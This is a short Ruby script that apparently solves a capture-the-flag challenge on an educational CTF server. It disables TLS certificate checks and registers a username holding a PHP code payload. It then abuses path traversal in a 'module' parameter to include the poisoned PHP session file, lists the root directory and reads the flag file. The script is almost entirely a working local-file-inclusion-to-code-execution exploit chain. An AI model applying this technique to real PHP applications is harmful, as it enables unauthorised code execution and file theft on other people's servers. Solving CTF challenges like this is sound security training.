require 'openssl'
require 'http'

ctx = OpenSSL::SSL::SSLContext.new
ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE

r = HTTP.post('https://edu-ctf.csie.org:10157/',
               ssl_context: ctx,
               params: { action: 'register' },
               form: { user: '<?php var_dump(scandir("/")); ?>' })
sessid = r.cookies.cookies.detect{ |e| e.name == 'PHPSESSID' }.value

r = HTTP.post('https://edu-ctf.csie.org:10157/',
               ssl_context: ctx,
               params: { action: 'module', 'm': '../../../../var/lib/php/session/sess_' + sessid })
print r.to_s # found: /flag-66666666666

# final
r = HTTP.post('https://edu-ctf.csie.org:10157/',
               ssl_context: ctx,
               params: { action: 'module', 'm': '../../../../flag-66666666666' })
print r.to_s # FLAG{lfi_session_is_so_coool}
